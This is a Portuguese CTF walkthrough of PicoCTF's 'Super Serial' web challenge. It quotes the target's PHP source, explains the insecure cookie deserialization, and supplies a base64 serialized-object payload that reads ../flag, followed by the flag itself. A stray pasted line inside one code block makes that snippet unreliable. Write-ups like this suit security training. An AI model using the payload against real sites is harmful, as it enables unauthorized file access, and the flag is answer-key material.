# Super Serial (PicoCTF)

> Categoria: Web Exploitation
> 
> Autor: madStacks

Ao entrar no CTF temos a opção de lançar uma instância, ao fazer isso chegamos em uma de uma página de login. Experimentando com a página, mais especificamente no ***Robots.txt***, vemos um caminho para um diretório de um código *.phps* chamado de *admin.phps*, porém, esse diretório não existe (404). Isso nos induz a testar outros diretórios *.phps*, então, ao trocar ***index.php*** para ***index.phps*** chegamos no seguinte código:

```
if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {Deserialization error. picoCTF{1_c4nn0t_s33_y0u_2fba20fa} 
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
```

Como podemos ver na linha:
> "header("Location: authentication.php");"

Temos outro código *.php*/*.phps*, e dessa vez sendo na página de autenticação de login:

```
require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
```

Logo na primeira linha podemos ver que ele primeiro checa o valor de um cookie para verificar se o usuário é um administrador, logo, vamos conferir o ***cookie.phps***:

```
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

```

Interpretando esse código é possível notar uma falha de segurança utilizando a deserialização do valor de um cookie, resumidamente, a página lê o valor de um cookie de login para checar os privilégios de um usuário, e ela usa serialização para isso, logo, já que podemos criar e modificar cookies livremente, podemos criar um cookie de login com o valor sendo um ***payload***:

> TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9

Basta criar um cookie página *authentication.php* com o nome de "login" e o valor dele sendo o nosso payload, assim conseguimos a flag:

> Deserialization error. picoCTF{1_c4nn0t_s33_y0u_2fba20fa} 